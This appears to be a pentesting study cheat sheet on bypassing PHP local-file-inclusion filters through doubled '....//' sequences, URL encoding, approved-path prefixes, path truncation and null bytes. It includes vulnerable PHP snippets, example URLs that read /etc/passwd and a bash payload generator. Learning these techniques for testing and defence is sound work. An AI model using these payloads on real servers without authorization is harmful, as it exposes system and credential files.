## 1. Non-Recursive Path Traversal Filters

Some applications use basic string replacement to remove `../` but fail to do so recursively.

* **Vulnerable Code:**
```php
$language = str_replace('../', '', $_GET['language']);

```


* **Bypass:** Double the characters. When the filter removes the inner `../`, the remaining characters collapse to form a valid `../`.
* **Payloads:**
* `....//`
* `..././`
* `....\/`
* `....////`


* **Example URL:**
```text
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd

```



## 2. URL Encoding

Filters blocking specific characters like dots (`.`) or slashes (`/`) can sometimes be bypassed by URL encoding the input. (Note: Double URL encoding is also an option if single encoding fails).

* **Concept:** Encode `../` so it passes the filter but gets decoded by the backend before being processed.
* **Payload (URL Encoded `../`):** `%2e%2e%2f`
* **Example URL:** *(Encodes `../../../../etc/passwd`)*
```text
http://<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

```



## 3. Approved Paths

Applications may use Regular Expressions to ensure the requested file starts with a specific, approved directory path.

* **Vulnerable Code:**
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
}

```


* **Bypass:** Start the payload with the mandated approved path, and then immediately use path traversal to back out to the root directory.
* **Example URL:**
```text
http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd

```



## 4. Appended Extension Bypasses (Legacy PHP)

If the application appends an extension (e.g., `.php`) to the input, standard LFI fails (e.g., `/etc/passwd.php`). Modern PHP prevents bypassing this, but **older versions (PHP < 5.3/5.4/5.5)** are vulnerable to two legacy techniques.

### A. Path Truncation (PHP < 5.3/5.4)

* **Concept:** Older PHP versions truncate strings exceeding 4096 characters. By padding the file path with valid but redundant characters (like `./`), the appended `.php` gets pushed past the 4096-character limit and is discarded.
* **Requirement:** The path must begin with a non-existent directory.
* **Payload Structure:**
```text
?language=non_existing_directory/../../../etc/passwd/./././././ [REPEATED ~2048 times]

```


* **Command to generate payload:**
```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

```



### B. Null Byte Injection (PHP < 5.5)

* **Concept:** Lower-level languages treat a null byte (`%00`) as the end of a string. Adding this before the appended extension causes PHP to ignore the `.php` part.
* **Payload:** `%00`
* **Example URL:**
```text
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd%00

```


*(The backend evaluates `/etc/passwd%00.php`, terminating at the null byte and resolving perfectly to `/etc/passwd`).*
